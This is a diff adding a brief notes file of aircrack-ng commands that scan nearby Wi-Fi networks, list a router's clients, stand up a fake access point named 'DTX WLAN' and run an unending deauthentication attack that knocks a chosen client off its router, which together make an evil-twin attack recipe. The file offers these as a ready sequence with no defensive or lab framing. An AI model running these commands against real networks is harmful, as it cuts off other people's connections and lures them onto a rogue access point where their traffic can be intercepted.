@@ -1,0 +1,11 @@
+#get networks aroun you
+airodump-ng wlan0
+
+#get clients connected to router
+airodump-ng -bssid <mac> -c <channel> wlan0
+
+#start wifi server
+airbase-ng -e "DTX WLAN" -a <mac> -c 1 wlan0
+
+#deauth
+aireplay-ng --deauth 0 -a <router mac> -c <client mac> wlan0
